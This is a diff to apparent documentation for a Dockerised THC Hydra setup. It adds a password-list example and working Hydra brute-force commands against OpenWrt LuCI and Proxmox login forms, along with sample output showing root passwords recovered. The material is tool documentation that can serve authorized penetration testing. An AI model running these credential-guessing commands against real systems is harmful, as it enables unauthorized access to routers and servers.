@@ -27,19 +27,33 @@ $ docker-compose up -d
 
 $ docker-compose exec hydra bash
 
->>> cat passwd.txt
+# https://github.com/danielmiessler/SecLists
+>>> cat passwords.lst
     123456
     admin
+    secret
     ...
 
->>> hydra -l admin -P passwd.txt -o hacked.txt http://www.target.com/login.php
-    [DATA] max 1 task per 1 server, overall 64 tasks, 3 login try (l:1/p:1), ~0 tries per task
-    [DATA] attacking service http-get on port 2812
-    [2812][http-get] host: www.target.com   login: admin   password: admin
+# Manual
+>>> hydra -U http-post-form
+
+# OpenWrt
+>>> hydra -vVf -t 1 -l root -P passwords.lst -o results.txt "http-post-form://192.168.1.1:80/cgi-bin/luci/:luci_username=^USER^&luci_password=^PASS^:F=Forbidden"
+    [80][http-post-form] host: 192.168.1.1   login: root   password: admin
     1 of 1 target successfully completed, 1 valid password found
 
->>> cat hacked.txt
-    [2812][http-get] host: www.target.com   login: admin   password: admin
+# Proxmox
+>>> hydra -vVf -t 1 -l root -P passwords.lst -o results.txt "https-post-form://192.168.1.1:8006/api2/extjs/access/ticket:username=^USER^&password=^PASS^&realm=pam&new-format=1:F=failure"
+
+>>> cat results.txt
+    [80][http-post-form] host: 192.168.1.1   login: root   password: admin
+    [8006][http-post-form] host: 192.168.1.1   login: root   password: secret
 ```
 
+> [!Tip]
+> View more [examples][4]
+
 [1]: https://github.com/vanhauser-thc/thc-hydra
+[2]: https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-http-form.c
+[3]: https://www.kali.org/tools/hydra/
+[4]: https://github.com/Ilias1988/Hacking-Cheatsheets/blob/main/Hydra/README.md
